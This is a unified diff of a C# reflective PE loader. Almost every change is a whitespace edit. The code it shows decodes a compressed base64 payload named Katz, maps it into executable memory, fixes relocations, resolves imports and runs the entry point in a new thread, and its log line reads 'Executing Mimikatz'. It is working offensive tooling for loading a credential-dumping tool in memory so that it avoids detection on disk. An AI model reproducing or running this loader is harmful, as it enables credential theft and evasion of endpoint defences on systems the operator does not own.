@@ -19,7 +19,6 @@ using System.IO;
 using System.IO.Compression;
 using System.Text;
 using System.Collections.Generic;
-
 using System.Runtime.InteropServices;
 
 namespace PELoader
@@ -53,12 +52,8 @@ namespace PELoader
         {
             byte[] FromBase64 = System.Convert.FromBase64String(Katz.KatzCompressed);
             byte[] decompressed = Decompress(FromBase64);
-
             PELoader pe = new PELoader(decompressed);
-
-            IntPtr codebase = IntPtr.Zero;
-
-            
+            IntPtr codebase = IntPtr.Zero;          
             Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader32.ImageBase.ToString("X4"));
             codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader32.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
             Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader32.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
@@ -67,46 +62,33 @@ namespace PELoader
             for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
             {
                 IntPtr y = NativeDeclarations.VirtualAlloc((IntPtr)((long)(codebase.ToInt64() + (int)pe.ImageSectionHeaders[i].VirtualAddress)), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
-
-
                 Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
                 Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
             }
-
             IntPtr currentbase = codebase;
-            long delta = (int)(currentbase.ToInt32() - (int)pe.OptionalHeader32.ImageBase);
-          
+            long delta = (int)(currentbase.ToInt32() - (int)pe.OptionalHeader32.ImageBase);        
             Console.WriteLine("Delta = {0}", delta.ToString("X4"));
-
+            
             //Modify Memory Based On Relocation Table
             IntPtr relocationTable = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader32.BaseRelocationTable.VirtualAddress));           
-
             NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
             relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
-
             int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
             IntPtr nextEntry = relocationTable;
             int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
             IntPtr offset = relocationTable;
-
             while (true)
             {
-
                 NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                 IntPtr x = (IntPtr)((long)(relocationTable.ToInt64() + (int)sizeofNextBlock));
-
                 relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
-
                 IntPtr dest = (IntPtr)((long)(codebase.ToInt64() + (int)relocationEntry.VirtualAdress));
-
                 for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                 {
                     IntPtr patchAddr;
                     UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));
-
                     UInt16 type = (UInt16)(value >> 12);
                     UInt16 fixup = (UInt16)(value & 0xfff);
-
                     switch (type)
                     {
                         case 0x0:
@@ -122,19 +104,16 @@ namespace PELoader
                 offset = (IntPtr)((long)(relocationTable.ToInt64() + (int)sizeofNextBlock));
                 sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                 relocationEntry = relocationNextEntry;
-
                 nextEntry = (IntPtr)((long)(nextEntry.ToInt64() + (int)sizeofNextBlock));
-
                 if (relocationNextEntry.SizeOfBlock == 0) break;
             }
+            
             //Resolve Imports
-
             IntPtr z = (IntPtr)((long)(codebase.ToInt64() + (int)pe.ImageSectionHeaders[1].VirtualAddress));
             IntPtr oa1 = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader32.ImportTable.VirtualAddress));
             int oa2 = Marshal.ReadInt32((IntPtr)((long)(oa1.ToInt64() + (int)16)));
       
             //Get And Display Each DLL To Load
-
             IntPtr threadStart;
             IntPtr hThread;
             int j = 0;
@@ -147,7 +126,6 @@ namespace PELoader
                 IntPtr dllNamePTR = (IntPtr)((long)(codebase.ToInt64() + temp));
                 string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                 if (DllName == "") { break; }
-
                 IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                 Console.WriteLine("Loaded {0}", DllName);
                 int k = 0;
@@ -163,16 +141,15 @@ namespace PELoader
                 }
                 j++;
              }
+            
              //Transfer Control To OEP
              Console.WriteLine("Executing Mimikatz");
              threadStart = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader32.AddressOfEntryPoint));
              hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
              NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
-
              Console.WriteLine("Thread Complete");
            
             //Transfer Control To OEP
-
             Console.WriteLine("Thread Complete");
         } //End Main
 
